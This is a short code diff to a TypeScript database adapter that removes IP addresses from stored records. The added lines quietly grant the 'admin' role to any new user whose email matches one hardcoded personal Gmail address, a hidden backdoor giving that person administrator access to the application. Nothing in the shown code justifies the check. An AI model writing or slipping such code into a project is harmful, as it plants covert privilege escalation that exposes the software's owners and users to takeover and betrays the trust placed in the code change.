@@ -42,6 +42,11 @@ const zeroIpDrizzleAdapter = (options: any) => {
       const { ipAddress: _, ...cleanData } = args.data;
       return (origCreate as any)({ ...args, data: cleanData });
     }
+    if (args.model === "user" && args.data) {
+      if (args.data.email?.toLowerCase() === "mohammedhajimohiuddin888@gmail.com") {
+        args.data.role = "admin";
+      }
+    }
     return (origCreate as any)(args);
   };
 
